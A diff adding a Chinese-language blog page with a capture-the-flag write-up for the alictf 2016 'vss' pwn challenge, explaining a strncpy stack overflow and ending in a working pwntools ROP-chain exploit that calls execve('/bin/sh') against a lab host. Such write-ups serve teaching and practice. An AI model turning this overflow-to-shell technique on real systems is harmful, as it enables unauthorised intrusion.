@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>alictf 2016 pwn vss wp | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前置知识：{
+（1）strncpy 是 C语言的库函数之一，来自 C语言标准库，定义于 string.h，char *strncpy(char *dest, const char *src, int n)，把src所指向的字符串中以src地..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">alictf 2016 pwn vss wp</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>前置知识：{<br>
+（1）strncpy 是 C语言的库函数之一，来自 C语言标准库，定义于 string.h，char *strncpy(char *dest, const char *src, int n)，把src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回被复制后的dest。<br>
+（2）MOVZX指令<br>
+汇编语言数据传送指令MOV的变体。无符号扩展，并传送。<br>
+movzx是将源操作数的内容拷贝到目的操作数，并将该值0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。<br>
+　　movzx 32位通用寄存器, 8位通用寄存器/内存单元<br>
+　　movzx 32位通用寄存器, 16位通用寄存器/内存单元<br>
+　　movzx 16位通用寄存器, 8位通用寄存器/内存单元<br>
+　　举个例子。例如<br>
+　　令eax=00304000h<br>
+　　若执行 movzx eax, ax后 eax = 00004000h 。<br>
+　　若执行 movzx eax, ah后 eax = 00000040h。<br>
+　　又如：<br>
+　　MOV BL,80H<br>
+　　MOVZX AX,BL<br>
+　　运行完以上汇编语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。<br>
+　　总结:<br>
+　　movzx其实就是将我们的源操作数取出来,然后置于目的操作数,目的操作数其余位用0填充。<br>
+（3）ret2syscall  控制程序执行系统调用，获取 shell。<br>
+32位下<br>
+int 80h引发系统中断<br>
+系统调用号，即 eax 应该为 0xb<br>
+第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br>
+第二个参数，即 ecx 应该为 0<br>
+第三个参数，即 edx 应该为 0<br>
+64位下<br>
+syscall 引发系统中断（ps：syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。）<br>
+rax存放系统调用号<br>
+rdi，rsi，rdx，r10，r8，r9依次存放函数所需的6个参数<br>
+（ps：x64系统调用函数，需要给rax传对应函数的值，具体参考：http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/）<br>
+（4）执行execve(&quot;/bin/sh&quot;,0,0)可以getshell<br>
+（5）关于alarm<br>
+https://www.jb51.net/article/159124.htm<br>
+（6）puts 和 printf的用法一样,puts()函数的作用与语句“printf(&quot;%s\n&quot;,s);的作用相同<br>
+}</p>
+<p>1.下载题目文件，然后配合socat搭建pwn题目环境</p>
+<p>2.checksec 查看保护机制<br>
+<img src="https://closefrom.github.io/post-images/1615576621893.png" alt="" loading="lazy"></p>
+<ol start="3">
+<li>ida<em>64打开该文件，并且在ubuntu运行支持远程ida</em>64调试的文件</li>
+</ol>
+<p>4.查看main函数<br>
+<img src="https://closefrom.github.io/post-images/1615576678075.png" alt="" loading="lazy"><br>
+发现有read函数可以利用，然后调用了一个verify的函数并且传入被read函数写入的字符，跟入verify<br>
+<img src="https://closefrom.github.io/post-images/1615576701363.png" alt="" loading="lazy"><br>
+可以看到有很多奇奇怪怪的东西，不过主要就是一个调用函数，以及if分支语句</p>
+<p>5.sub_400330函数其实就是strncpy：<br>
+<img src="https://closefrom.github.io/post-images/1615576733279.png" alt="" loading="lazy"><br>
+在main函数第一行断点，运行到read，随便输入<br>
+<img src="https://closefrom.github.io/post-images/1615576760537.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615576779436.png" alt="" loading="lazy"><br>
+可以看到read是从rsi中的地址处开始写入读入的字符串的，然后步入verify函数，运行到sub_400330函数的位置<br>
+<img src="https://closefrom.github.io/post-images/1615576801451.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615576820713.png" alt="" loading="lazy"><br>
+运行sub_400330后<br>
+<img src="https://closefrom.github.io/post-images/1615576835524.png" alt="" loading="lazy"><br>
+符合srncpy函数的功能</p>
+<p>6.然后就是if分支<br>
+<img src="https://closefrom.github.io/post-images/1615576870068.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615576875870.png" alt="" loading="lazy"><br>
+即判断刚刚从input赋值过来的字符串中的第一和第二个字符串是否与py匹配，若有一个不匹配则进入if语句，第一次由于随意输入了内容，然后进入if语句中一直运行，直到程序崩溃了</p>
+<p>7.第二次调试， 输入py开头的字符串开始调试<br>
+<img src="https://closefrom.github.io/post-images/1615576901204.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615576908603.png" alt="" loading="lazy"><br>
+发现程序已经不崩溃了，只是返回地址出现了问题。（只需要将rsp指向返回地址即可执行指令）<br>
+<img src="https://closefrom.github.io/post-images/1615576925178.png" alt="" loading="lazy"><br>
+可以看到strncpy拷贝的字符串最后八个字节刚刚好可以覆盖返回地址</p>
+<ol start="8">
+<li></li>
+</ol>
+<p>先寻找改变rsp的指令<br>
+通过ROPgadget --binary ./vss --only &quot;add|ret&quot; | grep &quot;rsp&quot; 可以找到：<br>
+<img src="https://closefrom.github.io/post-images/1615576946456.png" alt="" loading="lazy"><br>
+由上面可知使用add rsp,0x58;ret这一条指令即可合适地改变rsp在栈中的指向<br>
+故：0x46f205 add rsp,0x58 ; ret</p>
+<ol start="9">
+<li></li>
+</ol>
+<p>因为提供的文件没有libc，文件中也没有system函数和/bin/sh函数之类的，所以要用到syscall，即调用syscall中的execve来getshell，所以要找到操作rdi，rsi，rdx，rax的指令，经过一番搜获得了：<br>
+ROPgadget --binary ./vss --only &quot;pop|ret&quot;<br>
+0x46f208 pop rax ; ret<br>
+0x401823 pop rdi ; ret<br>
+0x401937 pop rsi ; ret<br>
+0x43ae05 pop rdx ; ret<br>
+之前在ida中看到的其中一个syscall的地址：0x437ecf<br>
+sys_execve的系统调用号为59，16进制下的3b</p>
+<p>问题：字符串/bin/sh\x00是通过什么方式传入到rdi中？<br>
+解决1：通过将字符串写入到另一个寄存器中，然后通过这个寄存器传入到rdi中<br>
+解决1实现：<br>
+ROPgadget --binary ./vss --only &quot;mov|ret&quot;<br>
+0x422568 mov qword ptr [rdi],rcx ; ret<br>
+ROPgadget --binary ./vss --only &quot;pop|ret&quot; | grep &quot;rcx&quot;<br>
+0x462873 pop rcx ; ret</p>
+<p>解决2：asm将/bin/sh转为shellcode<br>
+解决2实现：手动查ascii表-&gt;0x0068732f6e69622f</p>
+<p>10.编写exp</p>
+<pre><code>
+from pwn import *
+
+context.binary = './vss'
+link = remote("192.168.93.137","6666")
+add_rsp_ret = 0x46f205
+rax_ret = 0x46f208
+rdi_ret = 0x401823
+rsi_ret = 0x401937
+rdx_ret = 0x43ae05
+syscall = 0x437ecf
+#shellcode = 0x0068732f6e69622f
+mov_rcx_to_rdi = 0x422568
+rcx_ret = 0x462873
+payload = p64(0x7970)
+payload += 'A'*0x40
+payload += p64(add_rsp_ret)
+payload += 'A'*0x8
+payload += p64(rax_ret)
+payload += p64(0x3b)
+payload += p64(rcx_ret)
+payload += '/bin/sh\x00'
+payload += p64(mov_rcx_to_rdi)
+#payload += p64(rdi_ret)
+#payload += p64(shellcode)
+payload += p64(rsi_ret)
+payload += p64(0)
+payload += p64(rdx_ret)
+payload += p64(0)
+payload += p64(syscall)
+link.recvuntil("Password:\n")
+link.sendline(payload)
+sleep(0.2)
+link.interactive()
+#注释的地方： shellcode：查找ascii表，写出来的8字节 16进制数据
+#经过试验 p64(rdi_ret)后，p64(shellcode)是不成功的
+#p64(rdi_ret) 后，'/bin/sh\x00' 也是不成功的
+#然而 p64(rcx_ret)后'/bin/sh\x00' 再 p64(mov_rcx_to_rdi) 却是可以的
+#so，rdi中应该装的是指向/bin/sh\x00字符串的地址
+</code></pre>
+<p>运行exp-&gt;getshell-&gt;cat flag<br>
+<img src="https://closefrom.github.io/post-images/1615577000438.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/linux下c程序常用保护机制/">
+                  <h3 class="post-title">
+                    （栈保护）linux下c程序常用保护机制
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
